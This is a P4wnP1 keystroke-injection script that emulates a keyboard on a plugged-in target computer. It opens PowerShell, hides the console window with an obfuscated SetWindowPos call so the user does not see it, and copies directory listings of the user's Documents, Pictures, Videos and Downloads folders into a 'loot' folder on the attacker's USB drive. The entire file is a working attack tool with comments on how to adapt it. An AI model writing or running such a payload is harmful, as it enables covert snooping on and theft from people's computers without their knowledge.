layout("gb-2");			//Keyboard layout
hide=true; 				//Set to true to hide the console window on the target
exit=true;				//Set to true to exit the console once finished

function hidePS() {
	type('$h=(Get-Process -Id $pid).MainWindowHandle;$ios=[Runtime.InteropServices.HandleRef];$hw=New-Object $ios (1,$h);$i=New-Object $ios(2,0);(([reflection.assembly]::LoadWithPartialName("WindowsBase")).GetType("MS.Win32.UnsafeNativeMethods"))::SetWindowPos($hw,$i,0,0,100,100,16512)')
  	press("ENTER");
}
//Hide an already opened PowerShell console, but keep input focus

typingSpeed(0,0);		//Typing as fast as possible
press("GUI r");
delay(500);
type("powershell\n");
delay(1000);
if (hide) { hidePS(); } //Hide the console if chosen to do so
type("$usbPath =((gwmi win32_volume -f 'label=''P4WNP1''').Name)\n");			//Replace 'P4WNP1' with your drive name
delay(100);
type("tree /F /A $env:USERPROFILE\\Documents > $usbPath\\loot\\$env:COMPUTERNAME-Documents_Dir.txt;tree /F /A $env:USERPROFILE\\Pictures > $usbPath\\loot\\$env:COMPUTERNAME-Pictures_Dir.txt;tree /F /A $env:USERPROFILE\\Videos > $usbPath\\loot\\$env:COMPUTERNAME-Videos_Dir.txt;tree /F /A $env:USERPROFILE\\Downloads > $usbPath\\loot\\$env:COMPUTERNAME-Downloads_Dir.txt\n");
//env:USERPROFILE returns the default directory where Documents, Pictures, Downloads, etc reside
//Using $env:COMPUTERNAME- so files from different computers don't get overwrote
//Stores outputs in loot folder on drive
if (exit) { type("exit\n"); } //Exit the console if chosen to do so